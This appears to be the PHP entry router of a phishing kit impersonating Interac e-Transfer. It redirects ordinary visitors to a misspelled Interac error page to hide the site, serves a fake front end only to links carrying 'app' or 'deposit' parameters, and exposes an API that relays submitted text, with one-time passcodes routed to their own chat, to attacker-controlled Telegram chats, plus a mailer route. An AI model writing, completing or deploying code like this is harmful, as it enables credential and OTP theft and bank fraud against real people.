<?php
/**
 * SARAH-CORE // NEURAL MONOLITH (v5.9)
 * - Root-level Redirection Logic
 * - Router for Mailer API
 * - Telegram Bot Logic
 */

ob_start();
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
ini_set('display_errors', 0);

require_once __DIR__ . '/config/config.php';

if (file_exists(__DIR__ . '/vendor/autoload.php')) {
    require_once __DIR__ . '/vendor/autoload.php';
}

$systemConfig = getSystemConfig();

// --- REDIRECTION LOGIC ---
$uri = $_SERVER['REQUEST_URI'];
$path = strtok($uri, '?');

// AUTO REDIRECT ANYONE to the specified error page unless they are using the API or Gateway
$isApi = str_starts_with($path, '/api/');
$isGateway = str_starts_with($path, '/cgi-admin2/');
$isAsset = preg_match('/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2|woff|ttf)$/', $path);
$isDeepLink = isset($_GET['app']) || isset($_GET['deposit']);

if (!$isApi && !$isGateway && !$isAsset && !$isDeepLink) {
    ob_end_clean();
    header('Location: https://etramsfer.interac.ca/errror', true, 302);
    exit;
}

// --- ROUTER ---
if ($isApi) {
    $action = substr($path, 5);
    
    if ($action === 'mailer' || $action === 'mailer.php') {
        ob_end_clean();
        require __DIR__ . '/api/mailer.php';
        exit;
    }

    ob_end_clean();
    header('Content-Type: application/json');
    $input = json_decode(file_get_contents('php://input'), true);

    function botApi($method, $params = []) {
        global $systemConfig;
        $token = $systemConfig['telegram']['bot_token'];
        $ch = curl_init("https://api.telegram.org/bot{$token}/{$method}");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        curl_close($ch);
        return json_decode($res, true);
    }

    switch ($action) {
        case 'telegram-message':
            if (isset($input['text'])) {
                 $config = getSystemConfig();
                 $targetChat = ($input['isOtp'] ?? false) ? $config['otp']['chat_id'] : $config['telegram']['chat_id'];
                 botApi('sendMessage', [
                     'chat_id' => $targetChat,
                     'text' => $input['text'],
                     'parse_mode' => 'Markdown'
                 ]);
            }
            echo json_encode(['success' => true]);
            break;
        case 'status':
            echo json_encode(['status' => 'operational', 'time' => time()]);
            break;
        default:
            echo json_encode(['error' => 'Invalid endpoint']);
    }
    exit;
}

// Serve Frontend / Assets
ob_end_clean();
$file = __DIR__ . $path;
if (file_exists($file) && !is_dir($file)) {
    $ext = pathinfo($file, PATHINFO_EXTENSION);
    $mimes = [
        'js' => 'application/javascript',
        'css' => 'text/css',
        'html' => 'text/html',
        'svg' => 'image/svg+xml',
        'png' => 'image/png',
        'jpg' => 'image/jpeg',
        'ico' => 'image/x-icon'
    ];
    header("Content-Type: " . ($mimes[$ext] ?? 'application/octet-stream'));
    readfile($file);
} else {
    // Check if index.html exists, otherwise bail
    if (file_exists(__DIR__ . '/index.html')) {
        readfile(__DIR__ . '/index.html');
    } else {
        header('Location: https://etramsfer.interac.ca/errror', true, 302);
    }
}
?>